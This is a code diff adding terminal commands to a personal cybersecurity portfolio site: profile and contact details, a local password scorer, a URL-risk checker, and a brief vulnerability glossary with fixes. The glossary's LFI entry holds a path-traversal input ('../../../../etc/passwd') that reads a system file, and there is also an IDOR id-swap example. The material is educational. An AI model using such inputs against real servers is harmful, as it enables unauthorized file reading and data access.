+    { t:'t-out',    v:'  🎯  TryHackMe: <span style="color:var(--cyan)">tryhackme.com/p/AasiqSec</span>' },
+    { t:'t-out',    v:'  🌐  Website  : <span style="color:var(--cyan)">cybaash.github.io</span>' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-dim',    v:'  Languages: Tamil · Urdu · English · Hindi' },
+    { t:'t-dim',    v:'  Open to: Pen testing, web security, full-stack dev' },
+    { t:'t-sep',    v:'╚══════════════════════════════════════════════════════╝' },
+  ]);
+});
+
+// ── SKILLS COMMAND ────────────────────────────────────────────────
+defCmd('skills', (args) => {
+  const filter = args[0]?.toLowerCase();
+  const allSkills = {
+    'cybersecurity': ['Ethical Hacking','CEH','Penetration Testing','OWASP Top 10','Threat Modeling','Cloud Security Architecture','Network Security','AI in Cybersecurity','Red Teaming for GenAI','CISO Leadership','Vulnerability Management','Incident Response','Malware Analysis','Zero Trust','Social Engineering Defense'],
+    'ai-ml':        ['Machine Learning with Python','Generative AI','Azure AI Essentials','Agentic AI','AI Pair Programming','Responsible AI','Working with LLMs','Machine Learning Classification','Decision Trees','K-Means Clustering'],
+    'cloud':        ['AWS Cloud Quest','AWS Security Champion','Snowflake Data Engineering','Cloud Architecture','Cloud Security','DevOps','Docker','Docker Compose','CI/CD','Infrastructure as Code'],
+    'programming':  ['Python','Python OOP','JavaScript','Node.js','Java','C++','C#/.NET','SQL','NoSQL','HTML/CSS'],
+    'linux':        ['Ubuntu Linux','Red Hat Enterprise Linux 9','Kali Purple','Linux Command Line','Network Security','TLS Security'],
+    'management':   ['Operations Management','Product Management','CISO Leadership','Leadership','Project Management','Quality Management'],
+  };
+
+  if (filter && allSkills[filter]) {
+    termPrint([{ t:'t-sep', v:`── ${filter.toUpperCase()} SKILLS ───────────────────────────────────────` }]);
+    allSkills[filter].forEach(s => termPrint({ t:'t-out', v:`  › ${s}` }));
+    termPrint({ t:'t-sep', v:'────────────────────────────────────────────────────────' });
+    return;
+  }
+
+  termPrint([{ t:'t-sep', v:'╔══ SKILLS OVERVIEW ═══════════════════════════════════╗' }]);
+  const counts = { 'cybersecurity':73,'ai-ml':51,'cloud':31,'programming':29,'linux':12,'management':28 };
+  Object.entries(counts).forEach(([cat, count]) => {
+    const bar = '█'.repeat(Math.min(20, Math.floor(count/4)));
+    termPrint({ t:'t-out', v:`  ${cat.padEnd(16)} <span style="color:var(--cyan)">${String(count).padStart(3)}</span>  <span style="color:var(--green)">${bar}</span>` });
+  });
+  termPrint([
+    { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+    { t:'t-out', v:'  Total: <span style="color:var(--green)">273+ certifications</span>' },
+    { t:'t-sep', v:'╚══════════════════════════════════════════════════════╝' },
+    { t:'t-dim', v:'  Filter: skills cybersecurity | ai-ml | cloud | programming | linux' },
+  ]);
+});
+
+// ── EXPERIENCE COMMAND ────────────────────────────────────────────
+defCmd('experience', () => {
+  termPrint([
+    { t:'t-sep',    v:'╔══ WORK EXPERIENCE ════════════════════════════════════╗' },
+    { t:'t-out',    v:'  <span style="color:var(--green)">●</span> <span style="color:var(--blue)">Managing Director & Founder</span> — Detoxy Hijama' },
+    { t:'t-dim',    v:'    Pune, Maharashtra | Aug 2020 — Present' },
+    { t:'t-dim',    v:'    Founded wellness enterprise, applied cybersecurity to' },
+    { t:'t-dim',    v:'    protect customer data, managed team of 8 employees.' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-out',    v:'  <span style="color:var(--text3)">●</span> <span style="color:var(--blue)">Operations Executive</span> — Haneez Enterprises Pvt. Ltd.' },
+    { t:'t-dim',    v:'    Pune, Maharashtra | May 2019 — Jul 2020' },
+    { t:'t-dim',    v:'    Managed 50+ Amazon SKUs, automated reporting via Excel' },
+    { t:'t-dim',    v:'    Macros, maintained Star seller rating.' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-out',    v:'  <span style="color:var(--text3)">●</span> <span style="color:var(--blue)">Storekeeper</span> — SKB Multy Shop' },
+    { t:'t-dim',    v:'    Tamil Nadu | Jun 2018 — May 2019' },
+    { t:'t-dim',    v:'    Maintained 99% inventory accuracy, coordinated vendors,' },
+    { t:'t-dim',    v:'    implemented barcode-based stock tracking.' },
+    { t:'t-sep',    v:'╚══════════════════════════════════════════════════════╝' },
+  ]);
+});
+defCmd('exp', (args) => TERM_COMMANDS['experience'](args));
+
+// ── WEBSITE COMMAND ───────────────────────────────────────────────
+defCmd('website', () => {
+  termPrint([
+    { t:'t-sep',    v:'╔══ CYBAASH WEBSITE ════════════════════════════════════╗' },
+    { t:'t-out',    v:'  <span style="color:var(--cyan)">CYBAASH // Autonomous Cyber Range</span>' },
+    { t:'t-out',    v:'  URL: <span style="color:var(--cyan)">https://cybaash.github.io</span>' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-dim',    v:'  Pages:' },
+    { t:'t-out',    v:'  / ................ Autonomous cyber range simulation' },
+    { t:'t-out',    v:'  /recruiter.html .. Clean CV view for recruiters' },
+    { t:'t-out',    v:'  /dashboard.html .. Operator dashboard (GitHub storage)' },
+    { t:'t-out',    v:'  /cyberbot/ ....... AI-powered cybersecurity assistant' },
+    { t:'t-out',    v:'  /admin/ .......... Admin panel (React)' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-dim',    v:'  Stack: HTML/CSS/JS · React · Gemini AI · GitHub Pages · PWA' },
+    { t:'t-sep',    v:'╚══════════════════════════════════════════════════════╝' },
+  ]);
+});
+
+// ── PASSWORD ANALYZER (100% local) ───────────────────────────────
+defCmd('password', (args) => {
+  const pw = args.join(' ');
+  if (!pw) { termPrint({ t:'t-warn', v:'Usage: password <yourpassword>  (analyzed locally, never sent anywhere)' }); return; }
+
+  const len = pw.length;
+  const hasL = /[a-z]/.test(pw), hasU = /[A-Z]/.test(pw);
+  const hasD = /\d/.test(pw),    hasS = /[^A-Za-z0-9]/.test(pw);
+
+  let score = 0;
+  if (len >= 20) score+=40; else if (len>=16) score+=35; else if (len>=12) score+=25; else if (len>=8) score+=15; else score+=5;
+  score += [hasL,hasU,hasD,hasS].filter(Boolean).length * 8;
+  score = Math.min(100, score);
+
+  const cs = (score>=80?'--green':score>=60?'--blue':score>=40?'--yellow':'--red');
+  const label = score>=80?'VERY STRONG':score>=60?'STRONG':score>=40?'MODERATE':score>=20?'WEAK':'VERY WEAK';
+  const charset = (hasL?26:0)+(hasU?26:0)+(hasD?10:0)+(hasS?32:0);
+  const entropy = charset>0 ? Math.round(len * Math.log2(charset)) : 0;
+  const bar = '█'.repeat(Math.round(score/10)) + '░'.repeat(10-Math.round(score/10));
+
+  termPrint([
+    { t:'t-sep', v:'╔══ PASSWORD ANALYSIS (LOCAL) ══════════════════════════╗' },
+    { t:'t-dim', v:'  🔒 Password never sent to any server' },
+    { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+    { t:'t-out', v:`  Score    : <span style="color:var(${cs})">${score}/100 — ${label}</span>` },
+    { t:'t-out', v:`  Strength : <span style="color:var(${cs})">${bar}</span>` },
+    { t:'t-out', v:`  Length   : ${len} characters` },
+    { t:'t-out', v:`  Entropy  : ~${entropy} bits` },
+    { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+    { t:'t-out', v:`  Lowercase : ${hasL ? '<span style="color:var(--green)">✓</span>' : '<span style="color:var(--text3)">○</span>'}  Uppercase : ${hasU ? '<span style="color:var(--green)">✓</span>' : '<span style="color:var(--text3)">○</span>'}  Numbers : ${hasD ? '<span style="color:var(--green)">✓</span>' : '<span style="color:var(--text3)">○</span>'}  Symbols : ${hasS ? '<span style="color:var(--green)">✓</span>' : '<span style="color:var(--text3)">○</span>'}` },
+    { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+  ]);
+
+  const tips = [];
+  if (!hasU) tips.push('Add uppercase letters (A-Z)');
+  if (!hasD) tips.push('Add numbers (0-9)');
+  if (!hasS) tips.push('Add special characters (!@#$%)');
+  if (len<12) tips.push('Use at least 12 characters');
+  if (/(.)\1{2,}/.test(pw)) tips.push('Avoid repeated characters');
+  if (/(password|admin|user|login)/i.test(pw)) tips.push('Avoid common words');
+
+  if (tips.length) {
+    termPrint({ t:'t-warn', v:'  Suggestions:' });
+    tips.forEach(t => termPrint({ t:'t-dim', v:`  → ${t}` }));
+  } else {
+    termPrint({ t:'t-out', v:'  <span style="color:var(--green)">✓ Strong password — no issues found</span>' });
+  }
+  termPrint({ t:'t-sep', v:'╚══════════════════════════════════════════════════════╝' });
+});
+defCmd('pw', (args) => TERM_COMMANDS['password'](args));
+
+// ── URL CHECKER (local heuristics) ───────────────────────────────
+defCmd('url', (args) => {
+  const u = args[0];
+  if (!u) { termPrint({ t:'t-warn', v:'Usage: url <url_to_check>' }); return; }
+
+  const flags = []; let score = 0;
+  if (!u.startsWith('https://')) { flags.push('Non-HTTPS — data may not be encrypted'); score+=20; }
+  if (/https?:\/\/\d+\.\d+\.\d+\.\d+/.test(u)) { flags.push('IP-based URL — suspicious'); score+=40; }
+  if (u.length > 100) { flags.push(`Long URL (${u.length} chars) — obfuscation risk`); score+=15; }
+  const dm = u.match(/https?:\/\/([^\/]+)/);
+  if (dm) {
+    const d = dm[1].toLowerCase();
+    if (/(login|verify|secure|account|update|confirm)/i.test(d)) { flags.push('Sensitive keyword in domain'); score+=20; }
+    if (d.split('.').length > 4) { flags.push('Excessive subdomains'); score+=15; }
+    if (/(bit\.ly|tinyurl|t\.co|ow\.ly)/i.test(d)) { flags.push('URL shortener — hides destination'); score+=25; }
+  }
+  if ((u.match(/%[0-9A-Fa-f]{2}/g)||[]).length > 3) { flags.push('Heavy URL encoding — possible obfuscation'); score+=15; }
+
+  score = Math.min(100, score);
+  const risk = score>=60?'HIGH':score>=30?'MEDIUM':'LOW';
+  const rc = risk==='HIGH'?'--red':risk==='MEDIUM'?'--yellow':'--green';
+
+  termPrint([
+    { t:'t-sep', v:'╔══ URL SAFETY CHECK ═══════════════════════════════════╗' },
+    { t:'t-out', v:`  URL  : ${sanitizeText(u.slice(0,55))}${u.length>55?'…':''}` },
+    { t:'t-out', v:`  Risk : <span style="color:var(${rc})">${risk}</span> (Score: ${score}/100)` },
+    { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+  ]);
+  if (flags.length) {
+    termPrint({ t:'t-warn', v:'  ⚠ Issues Found:' });
+    flags.forEach(f => termPrint({ t:'t-dim', v:`  → ${f}` }));
+  } else {
+    termPrint({ t:'t-out', v:'  <span style="color:var(--green)">✓ No suspicious patterns detected</span>' });
+  }
+  termPrint({ t:'t-sep', v:'╚══════════════════════════════════════════════════════╝' });
+});
+
+// ── CYBER KNOWLEDGE COMMAND ───────────────────────────────────────
+defCmd('cyber', (args) => {
+  const topic = args.join(' ').toLowerCase();
+  const topics = {
+    'sqli': ['SQL Injection (SQLi)','Injects malicious SQL to manipulate database queries.','Types: Classic, Blind, UNION-based, Time-based, Error-based','Impact: Data theft, auth bypass, RCE','Fix: Parameterized queries — cursor.execute("SELECT * FROM users WHERE id=%s",(id,))'],
+    'xss':  ['Cross-Site Scripting (XSS)','Injects scripts into web pages viewed by other users.','Types: Stored, Reflected, DOM-based','Impact: Session hijacking, credential theft, malware','Fix: Escape output, use CSP headers, textContent not innerHTML'],
+    'csrf': ['Cross-Site Request Forgery (CSRF)','Tricks authenticated users into submitting malicious requests.','Impact: Unauthorized actions on behalf of logged-in users','Fix: CSRF tokens, SameSite cookies, verify Origin header'],
+    'bof':  ['Buffer Overflow','Writing more data than buffer can hold, overwriting memory.','Types: Stack overflow, Heap overflow, Integer overflow','Impact: Arbitrary code execution, privilege escalation','Fix: Use memory-safe languages, enable ASLR, stack canaries'],
+    'owasp':['OWASP Top 10 (2021)','A01:Broken Access Control | A02:Cryptographic Failures','A03:Injection | A04:Insecure Design | A05:Misconfiguration','A06:Vulnerable Components | A07:Auth Failures','A08:Integrity Failures | A09:Logging Failures | A10:SSRF'],
+    'ssrf': ['Server-Side Request Forgery (SSRF)','Server makes requests to attacker-controlled destinations.','Impact: Access internal services, cloud metadata, port scanning','Fix: Validate URLs, block private IPs, allowlist outbound requests'],
+    'lfi':  ['Local File Inclusion (LFI)','Includes local server files via user-supplied path input.','Example: ?file=../../../../etc/passwd','Impact: File read, source disclosure, potential RCE','Fix: Whitelist allowed files, never concat user input to paths'],
+    'rce':  ['Remote Code Execution (RCE)','Allows attackers to run arbitrary code on the target server.','Common vectors: SQLi, deserialization, file upload, XXE, SSRF','Impact: Full server compromise, data exfiltration','Fix: Input validation, least privilege, WAF, patching'],
+    'xxe':  ['XML External Entity (XXE)','XML parser processes external entity references.','Impact: File read, SSRF, DoS (Billion Laughs)','Fix: Disable external entity processing, use defusedxml in Python'],
+    'idor': ['Insecure Direct Object Reference (IDOR)','Direct access to objects via manipulable user input.','Example: /user/profile?id=1337 → change to id=1338','Impact: Unauthorized data access, privacy violations','Fix: Access control on every object, use UUIDs not sequential IDs'],
+  };
+
+  if (!topic) {
+    termPrint([
+      { t:'t-sep', v:'╔══ CYBER KNOWLEDGE BASE ═══════════════════════════════╗' },
+      { t:'t-out', v:'  Available topics:' },
+      { t:'t-out', v:'  sqli | xss | csrf | bof | owasp | ssrf | lfi | rce | xxe | idor' },
+      { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+      { t:'t-dim', v:'  Usage: cyber sqli  |  cyber xss  |  cyber owasp' },
+      { t:'t-dim', v:'  Or ask Gemini: ask explain SQL injection in detail' },
+      { t:'t-sep', v:'╚══════════════════════════════════════════════════════╝' },
+    ]);
+    return;
+  }
+
+  const key = Object.keys(topics).find(k => topic.includes(k));
+  if (key) {
+    const [title, ...lines] = topics[key];
+    termPrint([{ t:'t-sep', v:`╔══ ${title} ` + '═'.repeat(Math.max(0,49-title.length)) + '╗' }]);
+    lines.forEach(l => termPrint({ t:'t-out', v:`  ${l}` }));
+    termPrint([
+      { t:'t-sep', v:'╚══════════════════════════════════════════════════════╝' },
+      { t:'t-dim', v:`  For more detail: ask explain ${title} with examples` },
+    ]);
+  } else {
+    termPrint({ t:'t-warn', v:`Topic not found. Try: cyber sqli | xss | csrf | bof | owasp | ssrf | lfi | rce` });
+  }
+});
+
+// ── HIRE COMMAND ──────────────────────────────────────────────────
+defCmd('hire', () => {
+  termPrint([
+    { t:'t-sep',    v:'╔══ HIRE MOHAMED AASIQ ════════════════════════════════╗' },
+    { t:'t-out',    v:'  <span style="color:var(--green)">● Available for Freelance</span>' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-dim',    v:'  Services:' },
+    { t:'t-out',    v:'  › Web application security audits & pen testing' },
+    { t:'t-out',    v:'  › Network security assessments' },
+    { t:'t-out',    v:'  › Full-stack web development (security-first)' },
+    { t:'t-out',    v:'  › Cloud security (AWS) architecture review' },
+    { t:'t-out',    v:'  › AI security consulting' },
+    { t:'t-out',    v:'  › Security awareness training' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-out',    v:'  📧 mohamedaasiq07@gmail.com' },
+    { t:'t-out',    v:'  📞 +91 95665 96077' },
+    { t:'t-sep',    v:'╚══════════════════════════════════════════════════════╝' },
+  ]);
+});
+
+// Update help command to include new commands
+const _origHelp = TERM_COMMANDS['help'];
+defCmd('help', (args) => {
+  if (!args.length) {
+    _origHelp(args);
+    termPrint([
+      { t:'t-sep', v:'──────────────────────────────────────────────────────' },
+      { t:'t-dim', v:'  PORTFOLIO & AI' },
+      { t:'t-out', v:'  aasiq / about         Mohamed Aasiq profile' },
+      { t:'t-out', v:'  contact               Contact information' },
+      { t:'t-out', v:'  skills [category]     Skills & certifications' },
+      { t:'t-out', v:'  experience            Work history' },
+      { t:'t-out', v:'  website               CYBAASH website info' },
+      { t:'t-out', v:'  hire                  Hire Mohamed Aasiq' },
+      { t:'t-out', v:'  password <pw>         Analyze password (local)' },
+      { t:'t-out', v:'  url <url>             Check URL safety (local)' },
+      { t:'t-out', v:'  cyber [topic]         Cybersecurity knowledge' },
+      { t:'t-out', v:'  ask <question>        Chat with Gemini AI' },
+      { t:'t-out', v:'  gemini key <key>      Set Gemini API key (local)' },
+    ]);
+    return;
+  }
+  _origHelp(args);
+});
+
 // ── PING ─────────────────────────────────────────────────────────
 defCmd('ping', (args) => {
   const target = args[0] || 'cybaash.internal';
